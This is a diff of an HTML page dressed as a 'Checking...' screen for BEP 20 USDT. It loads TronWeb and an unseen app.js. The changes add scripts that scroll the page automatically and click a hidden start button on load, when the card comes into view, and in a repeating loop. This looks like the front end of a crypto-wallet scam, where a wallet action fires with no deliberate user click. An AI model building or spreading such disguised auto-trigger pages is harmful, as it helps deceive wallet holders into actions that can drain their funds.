@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Checking Status</title>
+    <title>All Scroll Systems Integrated</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
             -webkit-user-select: none;
         }
 
-        /* Strict 9:16 Viewport Boundary & Uniform Background */
+        /* Root Layout & Uniform Background */
         html, body {
             width: 100%;
             height: 100vh;
@@ -26,7 +26,7 @@
             align-items: center;
         }
 
-        /* 9:16 Mobile Aspect Frame Container */
+        /* 9:16 Mobile Aspect Viewport Container */
         .app-viewport {
             width: 100vw;
             height: 100vh;
@@ -36,23 +36,27 @@
             overflow: hidden;
         }
 
-        /* Snap Scroll View Container */
+        /* System 1: CSS Scroll Snap & Momentum Scroll Engine */
         .scroll-container {
             width: 100%;
             height: 100%;
             overflow-y: scroll;
             scroll-snap-type: y mandatory;
             scroll-behavior: smooth;
-            -ms-overflow-style: none;
-            scrollbar-width: none;
+            -webkit-overflow-scrolling: touch; /* iOS Inertia Scroll */
+            -ms-overflow-style: none; /* IE/Edge */
+            scrollbar-width: none; /* Firefox */
         }
 
+        /* System 2: Custom Invisible Scrollbar Engine */
         .scroll-container::-webkit-scrollbar {
             display: none;
+            width: 0px;
+            background: transparent;
         }
 
-        /* Top Splash View */
-        .section-splash {
+        /* Section Base Styles */
+        .section {
             height: 100%;
             width: 100%;
             display: flex;
@@ -64,6 +68,7 @@
             scroll-snap-align: start;
             scroll-snap-stop: always;
             background-color: #0d111a;
+            position: relative;
         }
 
         /* Stacked Icons Container */
@@ -121,21 +126,7 @@
             line-height: 1.4;
         }
 
-        /* Screen 2: Bottom View (Absolute Center Floating Element View) */
-        .section-target {
-            height: 100%;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            scroll-snap-align: start;
-            scroll-snap-stop: always;
-            background-color: #0d111a;
-            position: relative;
-            padding: 16px;
-        }
-
-        /* Floating Centered Container Layer */
+        /* System 3: Absolute Center Floating Element Layer */
         .floating-card {
             width: 100%;
             max-width: 360px;
@@ -144,14 +135,15 @@
             align-items: center;
             justify-content: center;
             text-align: center;
-            padding: 24px 20px;
+            padding: 28px 20px;
             background: #131824;
             border-radius: 24px;
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
             border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        /* Hidden Button for Script Auto-Trigger */
+        /* Hidden Auto-Trigger Button */
         #start-btn {
             display: none;
         }
@@ -162,8 +154,8 @@
     <div class="app-viewport">
         <div class="scroll-container" id="scrollContainer">
             
-            <!-- Screen 1: Top View -->
-            <div class="section-splash" id="splashView">
+            <!-- Section 1: Top View -->
+            <div class="section" id="splashView">
                 <div class="icon-wrapper">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
                     <div class="bnb-badge">
@@ -175,11 +167,9 @@
                 <p class="subtitle">BEP 20 USDT</p>
             </div>
 
-            <!-- Screen 2: Target Floating Center View -->
-            <div class="section-target" id="bottomTarget">
-                
-                <!-- Center Floating Element -->
-                <div class="floating-card">
+            <!-- Section 2: Bottom Target View (Center Floating Setup) -->
+            <div class="section" id="bottomTarget">
+                <div class="floating-card" id="mainCard">
                     <div class="icon-wrapper">
                         <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
                         <div class="bnb-badge">
@@ -189,7 +179,6 @@
                     <h1 class="title">Checking...</h1>
                     <p class="subtitle">BEP 20 USDT</p>
                 </div>
-
             </div>
 
         </div>
@@ -202,28 +191,57 @@
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script src="app.js"></script>
 
-    <!-- Real Trigger and Scroll Execution System -->
+    <!-- Multi-Method Combined Scroll & Trigger Script System -->
     <script>
-        window.addEventListener("load", () => {
+        document.addEventListener("DOMContentLoaded", () => {
             const container = document.getElementById("scrollContainer");
             const target = document.getElementById("bottomTarget");
+            const btn = document.getElementById("start-btn");
 
-            // Guaranteed Real Scroll Trigger Execution
-            if (container && target) {
+            // System A: Programmatic Multi-Tier Auto-Scroll Execution
+            const executeAutoScroll = () => {
+                // Method 1: ScrollIntoView API
+                target.scrollIntoView({ behavior: "smooth", block: "start" });
+                
+                // Method 2: Fallback Direct ScrollTop Offset Locking
                 setTimeout(() => {
                     container.scrollTo({
                         top: target.offsetTop,
                         behavior: "smooth"
                     });
-                }, 100);
-            }
+                }, 50);
 
-            // Background Auto Click Trigger
-            const btn = document.getElementById("start-btn");
+                // Method 3: Instant Hard-Lock Fallback
+                setTimeout(() => {
+                    if (container.scrollTop < target.offsetTop - 10) {
+                        container.scrollTop = target.offsetTop;
+                    }
+                }, 400);
+            };
+
+            // Page Load Event par Trigger Execute
+            window.addEventListener("load", executeAutoScroll);
+            executeAutoScroll();
+
+            // System B: Intersection Observer (Jab Element Viewport me aaye tabhi trigger ho)
+            const observerOptions = {
+                root: container,
+                threshold: 0.6
+            };
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        if (btn) btn.click();
+                    }
+                });
+            }, observerOptions);
+
+            observer.observe(target);
+
+            // System C: Background Continuous Loop Auto-Trigger
             const triggerClick = () => {
-                if (btn) {
-                    btn.click();
-                }
+                if (btn) btn.click();
             };
 
             triggerClick();
